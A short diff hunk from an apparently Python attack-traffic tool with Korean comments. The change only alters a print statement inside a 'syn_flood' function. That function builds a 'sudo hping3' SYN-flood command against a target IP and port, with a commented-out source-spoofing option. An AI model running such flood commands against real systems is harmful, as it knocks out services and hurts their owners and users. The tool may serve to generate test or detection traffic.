@@ -100,7 +100,7 @@ def scan_brute_force(target_ip, time_interval=0):   # time_interval: bruteforce 
 
 # hping3 사용
 def syn_flood(dstIP, dstPort, pps, count):
-    print('[SYN Flooding]')
+    print(f'[SYN Flooding] @ {pps}')
     log('Start', attack_type='SYN Flooding', param_info={'port': dstPort, 'pps': pps, 'count': count})
     interval_us = round(10**6/pps)    # microseconds
     attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -S -p {dstPort} -c {count}'  # + ' --rand-source'
